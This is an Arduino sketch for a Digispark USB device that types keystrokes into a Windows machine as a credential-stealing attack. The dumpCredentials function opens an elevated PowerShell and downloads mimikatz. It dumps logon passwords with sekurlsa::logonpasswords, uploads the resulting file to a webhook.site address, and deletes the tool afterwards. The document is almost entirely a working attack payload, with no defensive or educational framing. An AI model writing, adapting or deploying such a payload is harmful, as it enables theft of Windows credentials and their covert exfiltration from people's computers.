#include "DigiKeyboard.h"

void blinkLed(void);
void dumpCredentials(void);


void setup() {
  pinMode(0, OUTPUT);
  pinMode(1, OUTPUT);

}

void loop() {
  digitalWrite(0,LOW);
  digitalWrite(0,LOW);
  
  dumpCredentials();  
  blinkLed();

}
void dumpCredentials(void){
  
  DigiKeyboard.update();
  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  DigiKeyboard.delay(100);

  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs"); 
  DigiKeyboard.delay(500);
  
  DigiKeyboard.println("cd $env:TEMP"); 
  DigiKeyboard.delay(500);
  
  DigiKeyboard.println("Invoke-WebRequest https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -UseBasicParsing -o .\mimikatz.zip");
  DigiKeyboard.delay(2000);

  DigiKeyboard.println("Expand-Archive -LiteralPath .\mimikatz.zip .\mimikatz");
  DigiKeyboard.delay(2000);

  DigiKeyboard.println(".\mimikatz\x64\mimikatz.exe sekurlsa::logonpasswords > text.txt exit");
  DigiKeyboard.delay(2000); 
  
  DigiKeyboard.println("Invoke-WebRequest -Uri https://webhook.site/79944d0a-bcd9-4954-a42e-c8d9a88255a6 -Method POST -InFile text.txt");
  DigiKeyboard.delay(2000); 

  DigiKeyboard.println("Remove-Item .\mimikatz\ -Recurse");
  DigiKeyboard.delay(2000);


  
}
void blinkLed(void){

  for(int i = 0; i < 10; i++)
  {
    digitalWrite(0,HIGH);
    digitalWrite(1,HIGH);
  
    delay(500);
  
    digitalWrite(0,LOW);
    digitalWrite(1,HIGH);
  }
}
